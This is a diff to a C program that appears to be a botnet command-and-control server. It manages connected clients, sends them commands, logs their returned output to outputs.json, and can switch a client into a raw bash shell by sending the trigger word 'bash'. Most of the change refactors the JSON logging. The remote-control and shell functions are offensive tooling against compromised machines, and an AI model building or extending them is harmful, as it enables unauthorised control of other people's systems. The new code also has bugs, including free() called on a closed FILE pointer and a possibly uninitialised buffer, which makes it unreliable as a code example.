@@ -30,9 +30,9 @@ void *handle_connection(void *my_connection);
 void *bot_command(void *current);
 void **get_time(char *buff);
 void **get_date(char *buff);
-json_object *build_json_object(connection *client, char *dataRecieved, char *inputCmd);
-void output_to_json(json_object *jsonObject);
-
+json_object *build_json_object();
+void append_json_object(json_object *passedJsonObject, connection *client, char *dataRecieved, char *inputCmd);
+void output_to_json(connection *client, char *dataRecieved, char *inputCmd);
 
 // Global Graceful Exit Flag
 int exitflag = 0;
@@ -162,7 +162,7 @@ void *handle_connection(void *arg)
             fd_count = count_connections(head);
         }
     }
-    return;
+    //return;
 }
 
 void *bot_command(void *arg)
@@ -175,6 +175,7 @@ void *bot_command(void *arg)
     connection *head = (connection *)arg;
     connection *tmp = (connection *)malloc(sizeof(connection));
 
+    // Set timeout values for sockets
     struct timeval timeout;
     timeout.tv_sec = TIMEOUT_VALUE;
     timeout.tv_usec = 0;
@@ -310,12 +311,26 @@ void *bot_command(void *arg)
                                 continue;
                             }
 
+                            // Data returned from client
                             recieved_data[bytes_recv] = '\0';
-                            printf("%s", tmp->dest_ip);
-                            json_object *timmy = build_json_object(tmp, recieved_data, data);
-                            output_to_json(timmy);
-                            printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
 
+                            // Prompt user to print return in terminal or .json file
+                            while (1) {
+                                printf("\nSend return output to .json file? y/N: ");
+                                fgets(data, sizeof(data), stdin);
+                                data[strcspn(data, "\n")] = 0;
+                                if (data[0] == 'y' || data[0] == 'Y') {
+                                    output_to_json(tmp, recieved_data, data);
+                                    break;
+                                }
+                                else if (data[0] == 'n' || data[0] == 'N') {
+                                    printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
+                                    break;
+                                }
+                                else {
+                                    continue;
+                                }
+                            }
                             tmp = tmp->next;
                         }
                     }
@@ -352,6 +367,7 @@ void *bot_command(void *arg)
                     }
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
+                    // Send trigger word 'bash' to client to force client to enter bash mode
                     send(tmp->pfds->fd, "bash", 5, 0);
 
                     // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
@@ -465,6 +481,7 @@ void *bot_command(void *arg)
     }
 }
 
+// Function to return current time
 void **get_time(char *buff)
 {
     time_t currentTime;
@@ -477,6 +494,7 @@ void **get_time(char *buff)
     strftime(buff, 100, "%I:%M %p", convertedTime);
 }
 
+// Function to return current date
 void **get_date(char *buff)
 {
     time_t currentTime;
@@ -488,98 +506,145 @@ void **get_date(char *buff)
     strftime(buff, 100, "%d/%m/%y", convertedTime);
 }
 
-json_object *build_json_object(connection *client, char *dataRecieved, char *inputCmd)
+// Function to read file and store in json object
+json_object *parse_json_file(FILE *fp)
 {
+    char *buffer;
 
+    // Create json object
+    json_object *parsed_json = json_object_new_object();
+
+    if (fp != NULL) {
+        // Seek to end of file
+        if (fseek(fp, 0, SEEK_END) == 0) {
+            // Return size of file
+            long size = ftell(fp);
+
+            // Assign memory to buffer based on size of file
+            buffer = malloc(sizeof(char) * (size + 1));
+            
+            // Return to beginning of file
+            fseek(fp, 0, SEEK_SET);
+
+            // Read whole file in to buffer
+            size_t len = fread(buffer, sizeof(char), size, fp);
+
+            // Write EOF
+            buffer[len++] = '\0';
+        }
+    }
+
+    // Parse contents of buffer to json_object
+    parsed_json = json_tokener_parse(buffer);
+
+    // Return json object
+    return parsed_json;
+}
+
+// Function to build template of json object
+json_object *build_json_object()
+{
+    // Create json object
+    json_object *jsonObject = json_object_new_object();
+
+    // Create identifier for json file
+    json_object *objectType = json_object_new_string("outputs");
+
+    // Create array for json object
+    json_object *outputsArray = json_object_new_array();
+
+    // Add objects to main json object
+    json_object_object_add(jsonObject,"type", objectType);
+    json_object_object_add(jsonObject,"returned results", outputsArray);
+
+    return jsonObject;
+
+}
+
+// Function to append information to json object
+void append_json_object(json_object *passedJsonObject, connection *client, char *dataRecieved, char *inputCmd)
+{
+    // Create date and time values
     char *timeBuffer = malloc(10);
     char *dateBuffer = malloc(10);
 
     get_time(timeBuffer);
     get_date(dateBuffer);
 
-    // Create json object
-    json_object *jasonObject = json_object_new_object();
+    // Create json results object
+    json_object *jsonObject = json_object_new_object();
 
-    json_object *objectType = json_object_new_string("outputs");
-
-
+    // Create properties' object and data
     json_object *propertiesObject = json_object_new_object();
-
     json_object *hostName = json_object_new_string(client->hostname);
     json_object *cmdName = json_object_new_string(inputCmd);
     json_object *time = json_object_new_string(timeBuffer);
     json_object *date = json_object_new_string(dateBuffer);
     json_object *ipAddr = json_object_new_string(client->dest_ip);
 
-
+    // Add to 'properties' object
     json_object_object_add(propertiesObject, "hostname", hostName);
     json_object_object_add(propertiesObject, "input command", cmdName);
     json_object_object_add(propertiesObject, "time", time);
     json_object_object_add(propertiesObject, "date", date);
     json_object_object_add(propertiesObject, "ip address", ipAddr);
 
-
+    // Create returned object and data
     json_object *returnedObject = json_object_new_object();
-
     json_object *results = json_object_new_string(dataRecieved);
 
+    // Add to 'returned' object
     json_object_object_add(returnedObject, "results", results);
 
-    json_object_object_add(jasonObject,"type", objectType);
-    json_object_object_add(jasonObject,"properties", propertiesObject);
-    json_object_object_add(jasonObject,"returned", returnedObject);
+    // Add both properties and returned objects to 'main' object
+    json_object_object_add(jsonObject,"properties", propertiesObject);
+    json_object_object_add(jsonObject,"returned", returnedObject);
 
-    return jasonObject;
+    // Get reference to json array object and store in array var
+    struct json_object *array;
+    json_object_object_get_ex(passedJsonObject, "returned results", &array);
+
+    // Add 'main' object to array
+    json_object_array_add(array, jsonObject);
 }
 
-
-void output_to_json(json_object *jsonObject)
+// Function to write json object to file
+void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
 {
     FILE *jsonFile;
 
     if ((jsonFile = fopen("outputs.json", "r+"))) {
         // file exists
-        //initialise a "dynamic" (ish) array
-        char *wordtoprint;
-        wordtoprint = calloc(10,  sizeof(char *));
 
-        //seek back until we find a comma, adding each char to the array
-        int i = 0;
-        char tmpchar = ' ';
+        // Parse json file in to json object
+        json_object *parsed_json_object = parse_json_file(jsonFile);
 
-        while (1)
-        {
-            tmpchar = getc(jsonFile);
-            if(tmpchar == ']' || tmpchar == EOF) {
-                break;
-            }
-            else {
-                if(tmpchar < 126 && tmpchar > 31) {
-                    wordtoprint[i] = tmpchar;
-                    i++;
-                    //allocate more memory to the array for the next char
-                    wordtoprint = realloc(wordtoprint, i*sizeof(char *));
-                }
-            }
-        }
+        // Close file that's opened in read mode
         fclose(jsonFile);
 
+        // Append output results to json object
+        append_json_object(parsed_json_object, client, dataRecieved, inputCmd);
+
+        // Open json file and write object
         jsonFile = fopen("outputs.json", "w");
-        fprintf(jsonFile, "%s", wordtoprint);
-        fputc(',', jsonFile);
-        fprintf(jsonFile, "%s", json_object_to_json_string(jsonObject));
-        fputc(']', jsonFile);
-        fclose(jsonFile);
-
+        fprintf(jsonFile, "%s", json_object_to_json_string(parsed_json_object));
     }
     else {
-        // file doesnt exist - queue dirty array fix
+        // file doesnt exist
+
+        // Create new json object
+        json_object *newJsonObject = build_json_object();
+
+        // Append output results to json object
+        append_json_object(newJsonObject, client, dataRecieved, inputCmd);
+
+        // Open json file and write object
         jsonFile = fopen("outputs.json", "w");
-        fputc('[', jsonFile);
-        fprintf(jsonFile, "%s", json_object_to_json_string(jsonObject));
-        fputc(']', jsonFile);
+        fprintf(jsonFile, "%s", json_object_to_json_string(newJsonObject));
     }
+    // Close jsonFile and free
     fclose(jsonFile);
+    free(jsonFile);
 }
 
 // Function to print welcome screen
